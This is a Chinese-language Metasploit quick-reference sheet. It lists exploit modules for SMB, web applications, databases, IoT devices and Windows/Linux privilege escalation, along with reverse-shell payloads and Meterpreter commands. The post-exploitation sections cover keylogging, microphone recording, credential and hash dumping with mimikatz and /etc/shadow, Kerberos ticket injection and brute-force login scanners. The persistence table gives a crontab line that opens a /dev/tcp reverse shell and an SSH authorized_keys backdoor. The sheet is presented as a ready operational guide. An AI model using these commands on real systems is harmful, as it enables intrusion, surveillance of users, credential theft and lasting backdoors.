# MSF 速查

## 1️⃣ 基础命令（关键词：基础命令, core, msfconsole, 参数）

| 命令 | 作用 | 搜索关键词 |
| --- | --- | --- |
| `msfconsole` | 启动 Metasploit | 启动, msfconsole |
| `version` | 查看版本 | 版本, version |
| `search ` | 搜索模块 | 搜索, search |
| `use ` | 使用模块 | 使用, use |
| `info` | 查看模块详细信息 | 模块信息, info |
| `show options` | 查看模块参数 | 参数, options |
| `show payloads` | 查看可用 payload | payload, show payloads |
| `show targets` | 查看模块支持目标 | targets, show targets |
| `show advanced` | 显示高级选项 | 高级选项, advanced |
| `set ` | 设置参数 | 设置, set |
| `setg ` | 设置全局参数 | 全局设置, setg |
| `unset ` | 取消参数 | 取消, unset |
| `unsetg ` | 取消全局参数 | 全局取消, unsetg |
| `exploit / run` | 执行模块 | 执行, exploit, run |
| `check` | 检测目标漏洞 | 检测, check |
| `back` | 返回上一级 | 返回, back |

***

## 2️⃣ 常见 Exploit 模块（扩展版，关键词版）

### SMB 漏洞

| 模块 | 作用 | 搜索关键词 |
| --- | --- | --- |
| `exploit/windows/smb/ms17_010_eternalblue` | SMB 永恒之蓝 | SMB, MS17-010, eternalblue |
| `exploit/windows/smb/psexec` | SMB 执行远程命令 | SMB, PSEXEC |
| `exploit/windows/smb/ms08_067_netapi` | 经典 NetAPI 漏洞 | SMB, MS08-067 |
| `auxiliary/scanner/smb/smb_login` | SMB 登录检测 | SMB, login |
| `exploit/windows/smb/ms17_010_eternalromance` | EternalRomance | SMB, EternalRomance |

### Web 攻击（HTTP/RCE/Upload）

| 模块 | 作用 | 搜索关键词 |
| --- | --- | --- |
| `exploit/multi/http/struts2_content_type_ognl` | Struts2 RCE | struts2, rce, http |
| `exploit/multi/http/struts2_rest_xstream` | Struts2 REST RCE | struts2, rest, xstream |
| `exploit/multi/http/tomcat_mgr_upload` | Tomcat 上传 | tomcat, upload |
| `exploit/multi/http/phpmyadmin_pma_auth_rce` | phpMyAdmin RCE | phpmyadmin, rce |
| `exploit/unix/webapp/php_eval` | PHP eval RCE | php, eval, web |
| `exploit/multi/http/joomla_http_header_rce` | Joomla RCE | joomla, rce |
| `exploit/multi/http/wp_admin_shell_upload` | WordPress 后台上传 | wordpress, upload |
| `exploit/unix/webapp/wp_php_exec` | WordPress PHP 执行 | wordpress, php, exec |
| `exploit/multi/http/drupal_drupalgeddon2` | Drupal RCE | drupal, drupalgeddon, rce |

### FTP/SSH 漏洞与爆破

| 模块 | 作用 | 搜索关键词 |
| --- | --- | --- |
| `exploit/unix/ftp/vsftpd_234_backdoor` | VSFTPD 反弹 shell | ftp, vsftpd, backdoor |
| `auxiliary/scanner/ssh/ssh_login` | SSH 爆破 | ssh, login, brute |
| `exploit/unix/ssh/libssh_auth_bypass` | libSSH 绕过认证 | ssh, libssh, bypass |
| `auxiliary/scanner/ftp/ftp_login` | FTP 登录爆破 | ftp, login, brute |
| `auxiliary/scanner/telnet/telnet_login` | Telnet 登录爆破 | telnet, login |

### 数据库漏洞

| 模块 | 作用 | 搜索关键词 |
| --- | --- | --- |
| `auxiliary/scanner/mssql/mssql_login` | MSSQL 登录爆破 | mssql, login |
| `auxiliary/admin/mssql/mssql_exec` | MSSQL 命令执行 | mssql, exec |
| `exploit/windows/mysql/mysql_payload` | MySQL payload | mysql, payload |
| `auxiliary/scanner/mysql/mysql_login` | MySQL 登录爆破 | mysql, login |
| `auxiliary/scanner/postgres/postgres_login` | PostgreSQL 登录 | postgres, login |
| `auxiliary/admin/postgres/postgres_sql` | PostgreSQL 执行 SQL | postgres, sql |

### Windows 本地提权 / 持久化漏洞

| 模块 | 作用 | 搜索关键词 |
| --- | --- | --- |
| `exploit/windows/local/ms10_015_kitrap0d` | Windows 本地提权 | windows, local, ms10\_015 |
| `exploit/windows/local/ms17_010_psexec` | 本地提权 / PSEXEC | windows, local, psexec |
| `exploit/windows/local/bypassuac` | 绕过 UAC 提权 | windows, uac, bypass |
| `exploit/windows/local/ask` | 本地提权 | windows, local, ask |
| `exploit/windows/local/service_persistence` | 服务持久化 | persistence, service |

### Linux 漏洞

| 模块 | 作用 | 搜索关键词 |
| --- | --- | --- |
| `exploit/linux/samba/is_known_pipename` | Samba 漏洞 | linux, samba |
| `exploit/linux/http/apache_mod_cgi_bash_env_exec` | Shellshock | linux, shellshock |
| `exploit/linux/misc/dirty_cow` | Dirty COW 提权 | linux, dirtycow |
| `exploit/linux/ssh/libssh_auth_bypass` | libSSH 绕过认证 | linux, ssh, bypass |

### IoT / 路由器 / 特殊设备

| 模块 | 作用 | 搜索关键词 |
| --- | --- | --- |
| `exploit/linux/http/tplink_smartplug_rce` | TP-Link 插件 RCE | tplink, rce |
| `exploit/multi/http/jenkins_script_console` | Jenkins RCE | jenkins, rce |
| `exploit/multi/http/gitlab_file_read` | GitLab 文件读取 | gitlab, file\_read |

***

## 3️⃣ Payload 速查（关键词：payload, meterpreter, reverse, shell）

### Windows

| Payload | 作用 | 搜索关键词 |
| --- | --- | --- |
| `windows/meterpreter/reverse_tcp` | TCP 反连 | windows, meterpreter, reverse\_tcp |
| `windows/meterpreter/bind_tcp` | TCP 绑定 | bind\_tcp |
| `windows/x64/meterpreter/reverse_https` | HTTPS 反连 | reverse\_https |
| `windows/shell/reverse_tcp` | Windows shell 反连 | shell, reverse\_tcp |

### Linux

| Payload | 作用 | 搜索关键词 |
| --- | --- | --- |
| `linux/x86/meterpreter/reverse_tcp` | Linux 反连 | linux, meterpreter, reverse\_tcp |
| `linux/x64/shell_reverse_tcp` | Linux shell | shell\_reverse\_tcp |

### 脚本语言

| Payload | 作用 | 搜索关键词 |
| --- | --- | --- |
| `php/meterpreter/reverse_tcp` | PHP 反连 | php, meterpreter |
| `python/meterpreter/reverse_tcp` | Python 反连 | python, meterpreter |
| `java/meterpreter/reverse_tcp` | Java 反连 | java, meterpreter |

***

## 4️⃣ Sessions 管理（关键词：会话, session, meterpreter）

| 命令 | 作用 | 搜索关键词 |
| --- | --- | --- |
| `sessions -l` | 列出会话 | sessions, list |
| `sessions -i ` | 进入会话 | sessions, interact |
| `sessions -k ` | 杀掉会话 | sessions, kill |
| `sessions -u ` | 升级 shell | upgrade, session |
| `background` | 后台挂起 | background |

***

## 5️⃣ Meterpreter 命令（关键词：meterpreter, shell, info, 文件, 网络, 权限）

### 信息收集

| 命令 | 作用 | 搜索关键词 |
| --- | --- | --- |
| `sysinfo` | 系统信息 | sysinfo |
| `getuid` | 当前用户 | getuid |
| `ipconfig` | 网络信息 | ipconfig |

### Shell & 文件操作

| 命令 | 作用 | 搜索关键词 |
| --- | --- | --- |
| `shell` | 系统 shell | shell |
| `ls / cd / pwd` | 文件操作 | 文件系统, ls, cd, pwd |
| `download ` | 下载文件 | download |
| `upload ` | 上传文件 | upload |
| `cat ` | 查看文件 | cat, view |

### 进程与权限

| 命令 | 作用 | 搜索关键词 |
| --- | --- | --- |
| `ps` | 查看进程 | ps |
| `migrate ` | 迁移进程 | migrate |
| `getpid` | 当前进程 | getpid |
| `getprivs` | 查看权限 | getprivs |
| `getsystem` | 自动提权 | getsystem |

### 截屏与键盘记录

| 命令 | 作用 | 搜索关键词 |
| --- | --- | --- |
| `screenshot` | 截屏 | screenshot |
| `record_mic -d 10` | 录音 10 秒 | record\_mic |
| `keyscan_start` | 开始记录键盘 | keyscan\_start |
| `keyscan_dump` | 导出按键 | keyscan\_dump |
| `keyscan_stop` | 停止记录 | keyscan\_stop |

### 网络与隧道

| 命令 | 作用 | 搜索关键词 |
| --- | --- | --- |
| `portfwd add -l 8080 -p 80 -r 192.168.1.10` | 端口转发 | portfwd, forward |
| `route add 192.168.2.0 255.255.255.0 1` | 添加内网路由 | route, 内网 |

***

## 6️⃣ 凭据与持久化（关键词：hash, 凭据, 持久化, mimikatz）

### Windows 凭据获取

| 模块/命令 | 作用 | 搜索关键词 |
| --- | --- | --- |
| `load kiwi` | 加载 mimikatz | kiwi, mimikatz |
| `creds_all` | 导出所有凭据 | creds\_all |
| `creds_msv` | MSV 模块凭据 | creds\_msv |
| `creds_ssp` | SSP 模块凭据 | creds\_ssp |
| `creds_tspkg` | TSPKG 模块 | creds\_tspkg |
| `creds_wdigest` | WDigest 明文 | creds\_wdigest |
| `lsa_dump_sam` | Dump SAM | sam, lsa |
| `lsa_dump_secrets` | Dump LSA Secrets | secrets |
| `kerberos_ticket_list` | 查看 Kerberos TGT | kerberos, ticket\_list |
| `kerberos_ticket_use ` | 注入 Kerberos 票据 | kerberos, use\_ticket |

### Hash 抓取

| 命令 | 作用 | 搜索关键词 |
| --- | --- | --- |
| `hashdump` | SAM 数据库 | hashdump |
| `smart_hashdump` | SYSTEM + SAM | smart\_hashdump |

### Windows 密码导出

| 命令 | 作用 | 搜索关键词 |
| --- | --- | --- |
| `run post/windows/gather/hashdump` | 导出 hash | post, hashdump |
| `run post/windows/gather/credentials/windows_autologin` | 自动登录密码 | autologin |
| `run post/windows/gather/credentials/credential_collector` | 收集凭据 | credential\_collector |

### Linux 凭据获取

| 命令/模块 | 作用 | 搜索关键词 |
| --- | --- | --- |
| `cat /etc/passwd` | 用户列表 | passwd |
| `cat /etc/shadow` | 密码 hash | shadow |
| `use post/linux/gather/hashdump` | Hash dump | linux, hashdump |
| `use post/linux/gather/enum_users_history` | 历史用户 | linux, users |
| `use post/linux/gather/check_logged_users` | 当前登录 | logged\_users |

### 数据库凭据

| 模块 | 作用 | 搜索关键词 |
| --- | --- | --- |
| MySQL | `auxiliary/scanner/mysql/mysql_login` | mysql, login |
| MSSQL | `auxiliary/scanner/mssql/mssql_login` | mssql, login |
| PostgreSQL | `auxiliary/scanner/postgres/postgres_login` | postgres, login |

### 持久化

| 方法 | 命令 | 搜索关键词 |
| --- | --- | --- |
| Windows - Meterpreter | `run persistence -U -i 10 -p 4444 -r ` | persistence, meterpreter |
| Windows - 注册表 | `use exploit/windows/local/persistence` | registry, persistence |
| Windows - 服务 | `use exploit/windows/local/service_persistence` | service, persistence |
| Linux - Crontab | `echo "* * * * * /bin/bash -i >& /dev/tcp// 0>&1" >> /etc/crontab` | crontab, persistence |
| Linux - SSH key | `echo "" >> ~/.ssh/authorized_keys` | ssh, persistence |

***

## 7️⃣ Auxiliary 模块（关键词：scanner, auxiliary, 扫描, 爆破, 信息收集）

### 主机/端口扫描

| 模块 | 搜索关键词 |
| --- | --- |
| `auxiliary/scanner/discovery/udp_sweep` | udp, sweep, scan |
| `auxiliary/scanner/portscan/tcp` | tcp, portscan |
| `auxiliary/scanner/portscan/syn` | syn, scan |
| `auxiliary/scanner/portscan/ack` | ack, scan |
| `auxiliary/scanner/portscan/xmas` | xmas, scan |

### 服务识别

| 模块 | 搜索关键词 |
| --- | --- |
| ftp/ftp\_version | ftp, version |
| ssh/ssh\_version | ssh, version |
| http/http\_version | http, version |
| smb/smb\_version | smb, version |
| mysql/mysql\_version | mysql, version |

### 爆破登录

| 服务 | 模块 | 搜索关键词 |
| --- | --- | --- |
| FTP | `ftp/ftp_login` | ftp, login |
| SSH | `ssh/ssh_login` | ssh, login |
| SMB | `smb/smb_login` | smb, login |
| RDP | `rdp/rdp_login` | rdp, login |
| Telnet | `telnet/telnet_login` | telnet, login |

### Web 辅助

| 模块 | 搜索关键词 |
| --- | --- |
| http\_login | http, login |
| http\_webdav\_scanner | webdav, scanner |
| tomcat\_mgr\_login | tomcat, login |
| joomla\_version | joomla, version |
| wordpress\_login | wordpress, login |
| wordpress\_xmlrpc\_login | wordpress, xmlrpc |

### SMB 辅助

| 模块 | 搜索关键词 |
| --- | --- |
| smb\_enumshares | smb, shares |
| smb\_enumusers | smb, users |
| smb\_enumgroups | smb, groups |
| smb\_enumusers\_domain | smb, domain |
| smb\_login | smb, login |
| smb\_version | smb, version |

### 信息收集

| 协议 | 模块 | 搜索关键词 |
| --- | --- | --- |
| NetBIOS | nbname | netbios, scan |
| SNMP | snmp\_enum, snmp\_login | snmp, enum, login |
| SMTP | smtp\_enum, smtp\_version | smtp, enum, version |
| SSL/TLS | openssl\_heartbleed, ssl\_version | ssl, heartbleed, version |
